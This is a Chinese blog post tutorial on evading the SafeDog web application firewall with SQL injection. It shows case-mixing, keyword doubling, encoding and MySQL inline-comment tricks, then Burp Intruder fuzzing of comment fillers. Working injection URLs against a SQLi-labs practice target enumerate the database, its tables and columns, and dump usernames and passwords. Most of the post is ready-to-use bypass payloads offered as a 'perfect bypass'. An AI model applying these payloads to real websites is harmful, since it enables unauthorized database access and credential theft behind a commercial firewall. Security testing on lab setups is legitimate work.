<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>SQL注入绕过安全狗 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="SQL注入绕过安全狗" />
<meta property="og:description" content="常规的几种绕过方式： 1. 大小写绕过： 如果程序中设置了过滤关键字，但是程序只是对 and ，AND 或者 or，OR 设置了关键字过滤，那么你就可以使用大小写过滤
例如 :and,or
当然不局限于 and，其它的例如 union 一些关键字如果只是设置了关键字过滤，没有进行深度过滤的话，都是可以使用大小写过滤的
2. 双写绕过：在程序中对某一个关键字例如 union 设置了过滤清空，那么此时你就可以用
UniunionOn 这么一来，就可以实现绕过
当然你是可以结合大小写绕过进行编写的
select id=1 Uniutionon from 3. 编码绕过：通过 url 编码将语句或关键字进行编码 4. 内联注释绕过： 在 mysql 中，内联注释里的 Sql 语句是会被执行的，语法如下：等价于 select * from users
/*!SELECT*/ * FROM users 如果在 /*!SELECT*/ 中里面不加 ! ，则 /*SELECT*/ 会以注释的形式存在，这时 select 将不会被当成语句执行，会出现语法错误
/*Select*/ From Users 报错如下所示：
使用该内连接进行绕过的时候，也是可以结合之前的大小写以及双写进行绕过的，结合实际情况进行选择
安全狗的详细绕过： 这里我们以安全狗作为案例，如果你按照常规方法输入 and，那么它会对这个进行一个过滤，从而出现如下界面
1. 安全狗 and 的绕过（防止 and 和 or 的注入）： 将 and 修改为 /*!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/199f02839879539792a9b3142fc1c7ba/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-02-26T12:32:55+08:00" />
<meta property="article:modified_time" content="2023-02-26T12:32:55+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">SQL注入绕过安全狗</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2 id="e8L68"><span style="color:#fe2c24;">常规的几种绕过方式：</span></h2> 
<p id="u39449abf"></p> 
<h3 id="oAbSF"><span style="color:#fe2c24;">1. 大小写绕过：</span></h3> 
<p id="uc511f20a">如果程序中设置了过滤关键字，但是程序只是对 and ，AND 或者 or，OR 设置了关键字过滤，那么你就可以使用大小写过滤</p> 
<p id="uc0c34f82"><span style="color:#ff9900;">例如 :and,or</span></p> 
<p id="u9da3defe">当然不局限于 and，其它的例如 union 一些关键字如果只是设置了关键字过滤，没有进行深度过滤的话，都是可以使用大小写过滤的</p> 
<p id="u7387b553"></p> 
<h3 id="lnRyi"><span style="color:#fe2c24;">2. 双写绕过：在程序中对某一个关键字例如</span></h3> 
<p id="udf43e412">union 设置了过滤清空，那么此时你就可以用</p> 
<p id="u0c6c2599"><span style="color:#ff9900;">UniunionOn </span>这么一来，就可以实现绕过</p> 
<p id="u42e4e538">当然你是可以结合大小写绕过进行编写的</p> 
<pre><code class="language-sql">select id=1 Uniutionon from </code></pre> 
<h3 id="ESKXf"><span style="color:#fe2c24;">3. 编码绕过：通过 url 编码将语句或关键字进行编码</span></h3> 
<p id="u2b8a92b0"></p> 
<h3 id="wBI91"><span style="color:#fe2c24;">4. 内联注释绕过：</span></h3> 
<p id="ua347a048">在 mysql 中，内联注释里的 Sql 语句是会被执行的，语法如下：等价于 <span style="color:#ff9900;">select * from users</span></p> 
<pre><code class="language-sql">/*!SELECT*/ * FROM users </code></pre> 
<p id="u8cea925f"></p> 
<p id="uc32e410a">如果在 /*!SELECT*/ 中里面不加 ! ，则 /*SELECT*/ 会以注释的形式存在，这时 select 将不会被当成语句执行，会出现语法错误</p> 
<p id="uc4d2a903"></p> 
<pre><code class="language-sql">/*Select*/ From Users </code></pre> 
<p id="uc1607a01"></p> 
<p id="ub1d0b3dd">报错如下所示：</p> 
<p id="ua046903a"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/e3/c5/bVaIr7ob_o.png"></p> 
<p id="u048fc10a"></p> 
<p id="u127d6364">使用该内连接进行绕过的时候，也是可以结合之前的大小写以及双写进行绕过的，结合实际情况进行选择</p> 
<p id="u54f6773f"></p> 
<h2 id="CogXg"><span style="color:#fe2c24;">安全狗的详细绕过：</span></h2> 
<p id="uf1a3b7b8"></p> 
<p id="u59d24279">这里我们以安全狗作为案例，如果你按照常规方法输入 and，那么它会对这个进行一个过滤，从而出现如下界面</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/f5/f7/vbluPm8A_o.png"></p> 
<h2 id="aqmrs"></h2> 
<h3 id="kwW0e"><span style="color:#fe2c24;">1. 安全狗 and 的绕过（防止 and 和 or 的注入）：</span></h3> 
<p id="u13d0c9cf">将 and 修改为 <span style="color:#ff9900;">/*!12345and*/</span></p> 
<p id="u3c22747f">注意12345是任意的五位数字，<span style="color:#ff9900;">五位！（通常4-6位数字）</span></p> 
<p id="ud0993d24">然后通过 burp 进行拦截，然后发送到 <span style="color:#ff9900;">intruder 模块</span></p> 
<p id="u3d2057ee"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/ca/a2/5zBXy584_o.png"></p> 
<p id="ubadd6b75"></p> 
<p id="ubdae210f">然后我们需要先点击 clear，然后选中 12345 点击 add</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/06/ae/KeNBaVXS_o.png"></p> 
<p id="u1a874772">然后即可进行爆破</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/c9/ef/USnkWgnK_o.png"></p> 
<p id="ub58fa785"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/bc/b9/CSY7cvUO_o.png"></p> 
<p id="u325085b8"></p> 
<p id="u387ddf0d"></p> 
<p id="u1ffb1a00">然后就是找特征值，例如 <span style="color:#ff9900;">14414 即为我们的 payload</span></p> 
<pre><code class="language-sql">http://security/Less-1/?id=2' /*14414and*/ 1=1 -- 1 </code></pre> 
<p id="u47dc713c"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/38/42/m9rxqUG1_o.png"></p> 
<p id="u2b6b7cee"></p> 
<p id="uc8600383"><span style="color:#ff9900;">and 绕过使用 /*!12345*/</span></p> 
<p id="u8143493b"><span style="color:#ff9900;">另外 12345 这几个数字是随机的，位数推荐 4-6 位</span></p> 
<p id="u88c46165"></p> 
<h3 id="NA55O"><span style="color:#fe2c24;">2. 安全狗 order by 的绕过（防止 ordery by 函数的利用）：</span></h3> 
<p id="udb231d21">当你的 get 请求 <span style="color:#ff9900;">order by</span> 如果是一起出现的时候，则会出现安全狗警告，这个时候你可以在 order 和 by 之间添加一些字符，（还是 4-6 位）触发页面如下：</p> 
<p id="u1484f733"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/31/13/yeFZ0sxC_o.png"></p> 
<p id="u1d47816c"></p> 
<p id="u84f2e152"><span style="color:#ff9900;">order /*特殊符号*/ by</span></p> 
<p id="ua4061893"><span style="color:#ff9900;">注意这里我们不用加上 ！，因为我们是添加干扰字符</span></p> 
<p id="u503cd9e7">这里和上面 and 或者 or 绕过的方式不同的是，这里我们采用的是 在 <span style="color:#ff9900;">order 和 by 之间添加干扰字符，而不是数字，从而实现绕 过</span></p> 
<p id="u4b4e01c1">推荐使用的特殊字符：<span style="color:#ff9900;">/$%^&amp;*</span></p> 
<p id="ub6b2e808">同样的原理，对其进行爆破之后，得到 payload 为 //%$</p> 
<pre><code class="language-sql"> http://security/Less-1/?id=2' order /*//%$*/ by 1 -- 1</code></pre> 
<p id="ucf4bb5b9"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/b6/15/6uR6CM6P_o.png"></p> 
<h3 id="dyqeB"></h3> 
<h3 id="MdRz4"><span style="color:#fe2c24;">3. 安全狗 select union 的绕过（防止联合查询 union）：</span></h3> 
<p id="u16f75c1c"><span style="color:#ff9900;">select 和 union 放在一起的时候会触发</span></p> 
<p id="u7e9b4888">跟上面那个 order by 放在一起会触发一样的绕过道理，不过 select union 需要我们再次通过 burp 进行 fuzz</p> 
<p id="u8fac0d65">既然一样的绕过方式，那么 <span style="color:#ff9900;">select /*/$%^*/ union 也是一样的方式，抓包，然后去 fuzz</span></p> 
<p id="u7f99cd77"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/6d/9f/RsbIpL6k_o.png"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/01/4a/slANyDlJ_o.png"></p> 
<pre><code class="language-sql">http://security/Less-1/?id=-2' union /*/$%^*/ select 1,2,3 -- 1 </code></pre> 
<p id="u06e3bc03"></p> 
<p id="u8c5cf6be">上面我们介绍的是 and ，or，以及 select union 联合查询的绕过， 但是这是远远不够的，<span style="color:#ff9900;">我们重点应该是放在如何绕过，从而查询数据</span></p> 
<h3 id="u3fuD"></h3> 
<h3 id="KvpPX"><span style="color:#fe2c24;">4. 查询数据的绕过：</span></h3> 
<p id="u784e4742"><span style="color:#ff9900;">database（）的绕过：</span></p> 
<p id="u678121c3"><span style="color:#ff9900;">database 和 （）</span>放在一起的时候会触发 waf</p> 
<p id="u27f0b0a2">因此在 database 和 （）之间添加干扰符即可</p> 
<p id="ufeacda43">这里的干扰符是 </p> 
<p id="ucaff220a"></p> 
<h4 id="IdvLT"><span style="color:#ff9900;">查询库的绕过语句：</span></h4> 
<p id="u218fcb06"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/d9/05/wNYiHeEq_o.png"></p> 
<pre><code class="language-sql"> http://security/Less-1/?id=-2' union /*/$%^*/ select 1,database/**/(),3 -- 1 </code></pre> 
<p id="uf2bbcfdc"></p> 
<p id="u43fffde3">查询到对应的数据库为 <span style="color:#ff9900;">security，接下来就是查询表</span></p> 
<p id="udc9c2a93"></p> 
<h4 id="FBE3z"><span style="color:#ff9900;">查询表的绕过：</span></h4> 
<p id="ubfd597fc"></p> 
<p id="u21332ac0"><span style="color:#ff9900;">第一个</span><span style="color:#0d0016;">绕过点</span><span style="color:#ff9900;">：</span> <span style="color:#ff9900;">information_schema.tables</span></p> 
<p id="uf4a49174">waf 会对后面那个 tables 进行拦截，要想绕过，需改成</p> 
<p id="u9cb72fc7"><span style="color:#ff9900;">information_schema./*tables*/</span></p> 
<p id="udba08029"><span style="color:#ff9900;">第二个</span><span style="color:#0d0016;">绕过点</span><span style="color:#ff9900;">：</span>from 和 information_schema./*tables*/</p> 
<p id="ua2bdd0cd">当这两个放在一起的时候就会触发 waf，尽管 <span style="color:#ff9900;">information_schema./*table*/</span> 进行了绕过，但是还是会触发 waf</p> 
<p id="u33f4740a">这里我们就要对 <span style="color:#ff9900;">from 和 information.schema./*!tables*/ </span>之间进行处理了</p> 
<p id="u1c1d4ce6"></p> 
<p id="ufd6866e2"></p> 
<pre><code class="language-sql"> http://security/Less-1/?id=-2' union /*/$%^*/ select 1,
group_concat(table_name),3 from --+ /*%/ %0a information_schema./*!tables*/ -- 1 </code></pre> 
<p id="uab63c38a"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/b7/99/R2D2UBPp_o.png"></p> 
<p id="ua3d9d6d7"></p> 
<p id="u51887efd"><span style="color:#ff9900;">绕过过程：</span>首先在 union 和 select 之间放干扰符号，然后在 <span style="color:#ff9900;">from 和 information_schema 之间</span>放 --+以及正确的干扰符，然后通过 %0a 进行换行，最后把 <span style="color:#ff9900;">information_schema.tables 中 tables 通过内联的方式进行绕过修改为 information_schema./*!tables*/</span></p> 
<p id="ueb050050">这里我们可以看到，数据全部都被取出来了，但是还有一个<span style="color:#ff9900;">局限的点</span>，这里我们没有通过 where 去指定对应的数据库，<span style="color:#ff9900;">where table_name = security</span>，因此它会查询出所有库里面的数据，因此我们还需要指出对应的库名才行</p> 
<p id="u80cf46b1"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/04/fd/ubqulPh3_o.png"></p> 
<p id="ud9f33023"></p> 
<p id="uc0558006"></p> 
<p id="ufacf1042">但是这里它又会出现 waf 拦截，因为 <span style="color:#ff9900;">information_schema 和 where </span>出现在了一起，因此又需要在中间添加干扰符，在 <span style="color:#ff9900;">information_schema./*!tables*/ /*干扰符*/ where 去进行 fuzz 测试</span></p> 
<pre><code class="language-sql"> http://security/Less-1/?id=-2' union /*/$%^*/ select 1,group_concat(table_name),3 
from --+/*%/ %0a information_schema./*!tables*/ /**/ 
where table_schema='security' -- 1</code></pre> 
<p id="ue5766bf1"></p> 
<p id="ubaf9f264">从而获取到 <span style="color:#ff9900;">security</span> 库所有的表名：</p> 
<p id="u9758f845"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/aa/2a/tQhoEq0X_o.png"></p> 
<p id="ua962d825"></p> 
<p id="ub01a1a2c"></p> 
<p id="u791d7b7a">接下来就是获取 security 对应表下的所有列名</p> 
<p id="u69fd5902">无非多添加了一个 and，<span style="color:#ff9900;">and 采用内联的方式进行绕过</span></p> 
<p id="u8f48f8a1"></p> 
<pre><code class="language-sql">http://security/Less-1/?id=-2' union 
/*/$%^*/ select 1,group_concat(column_name),3 
from -- +/*%/ %0a information_schema./*!columns*/
/**/ where table_schema='security' /*!12441and*/ table_name='users' -- 1</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/65/89/PyxgYMHL_o.png"></p> 
<p id="u632e5357"></p> 
<h4 id="U8i9j"><span style="color:#ff9900;">查询数据的绕过：</span></h4> 
<pre><code class="language-sql">http://security/Less-1/?id=-2' union 
/*/$%^*/ select 1,group_concat(username,0x3a,password),3 from /**/  users  -- + </code></pre> 
<p id="u835db7fc"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/51/8d/mYpEQxpx_o.png"></p> 
<h2 id="NYsjO"><span style="color:#fe2c24;">完美绕过安全狗</span></h2>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/5b97ccb3528e7d8145c7a9b2cb95d49d/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">linux中如何在命令行操作文本内容</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/4636b20ea68bf3815a3a92c1d3734ff8/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">按键控制LED闪烁实验</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>